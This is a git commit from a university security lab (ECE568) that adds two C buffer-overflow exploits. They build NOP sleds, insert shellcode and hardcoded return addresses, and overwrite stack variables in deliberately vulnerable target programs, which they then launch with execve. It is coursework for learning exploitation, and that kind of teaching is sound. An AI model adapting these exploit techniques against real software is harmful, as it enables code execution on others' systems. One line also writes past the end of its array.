1ef33b6d97d48287586fe180aac58ab1e60868ea
Ho Seok  Lee <leeho26@remote.ecf.utoronto.ca>
2022-02-05 21:19:11 -0500

    sploit3

--- ECE568-lab1/sploits/sploit2.c
+++ ECE568-lab1/sploits/sploit2.c
@@ -6,17 +6,58 @@
 
 #define TARGET "../targets/target2"
 
+#define shellcode_margin 128
+
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
-	char *	env[1];
+	char *	env[3];
+
+	char sploit_str[284];
+
+	// Targets
+	char buf_addr[] = "\x80\xfd\x21\x20";
+	// Variable "i" is located 0x108 away from start of "buf"
+	// Variable "len" is located 0x10c away from start of "buf"
+
+	// Fill with NOP until 0x108
+	int i = 0;
+	for (; i < 0x108; ++i)
+	{
+		sploit_str[i] = NOP;
+	}
+
+	// Append the shellcode
+	for (i = shellcode_margin; i < (shellcode_margin + strlen(shellcode)); ++i)
+	{
+		sploit_str[i] = shellcode[i - shellcode_margin];
+	}
+
+	// Skip "i" located at 0x108, replace value with 0x0b
+	sploit_str[0x108] = 0x0b;
+
+	// Since until 0x10c contains NOP, shellcode, and change to i, 0x10c + 8 bytes = 0x11c
+	// Change "len" to 0x11c - 1 = 0x11b
+	sploit_str[0x10c] = 0x1b;
+	sploit_str[0x10d] = 0x01;
+
+	// Append EOF character at 0x10e
+	sploit_str[0x10e] = 0;
+
+	for (i = 0; i < 284;){
+		//printf("%x\n", *(unsigned long *) &sploit_str[i]);
+		i = i + 4;
+	}
 
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = sploit_str;
 	args[2] = NULL;
 
-	env[0] = NULL;
+	env[0] = &sploit_str[0x10e];
+	// Hardcode little Endian target address with 8-byte proxy at head
+	env[1] = "abcdefgh\x80\xfd\x21\x20";
+	env[2] = NULL;
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
--- ECE568-lab1/sploits/sploit3.c
+++ ECE568-lab1/sploits/sploit3.c
@@ -12,8 +12,36 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 
+	// 68 for buffer + 8 for target = 72 characters for sploit string
+	char sploit_str[72];
+
+	// target1 &buf is located at 0x2021fe50 to 0x2021fe90 (64 = 0x40)
+	// Little Endian format
+	char target_addr[] = "\x50\xfe\x21\x20";
+
+	// Fill sploit string with NOP
+	int i = 0;
+	for (; i < 72; ++i)
+	{
+		sploit_str[i] = NOP;
+	}
+
+	// Attach the shellcode to the beginning since the buffer will be offset by junk characters "AAAA"
+	// We only need to ensure the length is under 88 and we want the shellcode to be within 88 characters
+	for (i = 0; i < strlen(shellcode); ++i)
+	{
+		sploit_str[i] = shellcode[i];
+	}
+
+	// Insert the target address of &buf right after the end of the copying with "targ"
+	// "AAAA" + 64 characters allocated with "buf" = 68
+	strcpy(&sploit_str[68], target_addr);
+
+	// Remove EOF character
+	sploit_str[72] = 0;
+
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = sploit_str;
 	args[2] = NULL;
 
 	env[0] = NULL;
